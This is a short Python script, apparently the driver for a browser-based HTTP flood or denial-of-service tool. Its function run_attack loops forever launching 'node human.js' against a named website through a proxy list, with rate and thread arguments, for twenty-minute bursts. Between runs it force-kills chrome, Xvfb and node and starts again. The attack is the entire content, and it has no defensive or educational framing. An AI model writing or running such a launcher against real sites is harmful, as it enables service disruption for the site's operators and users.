# -*- coding: utf-8 -*-
import subprocess
import time
import os
import signal

# --- Configuration ---
URL = "https://rg8369g.net/"
TIME_LIMIT = 1200
PROXY_FILE = "abc.txt"

def check_file_exists(filename):
    if not os.path.isfile(filename):
        print(f"Error: File '{filename}' not found.")
        return False
    return True

def run_attack():
    while True:
        if not check_file_exists(PROXY_FILE):
            print("Waiting for proxy file...")
            time.sleep(1)
            continue

        try:
            print(f"Starting new process on URL: {URL}")
            cmd = ["node", "human.js", URL, "1400", PROXY_FILE, "8", "821"]
            process = subprocess.Popen(cmd)           
            time.sleep(TIME_LIMIT)            
            if process.poll() is None:
                print("Stopping process...")
                process.terminate()            
        except Exception as e:
            print(f"An error occurred: {e}")
        print("Cleaning up system (chrome, node, Xvfb)...")
        subprocess.run(["pkill", "-9", "chrome"], stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "Xvfb"], stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "node"], stderr=subprocess.DEVNULL)
        print("Waiting 2 seconds before restart...")
        time.sleep(1)
if __name__ == "__main__":

    run_attack()

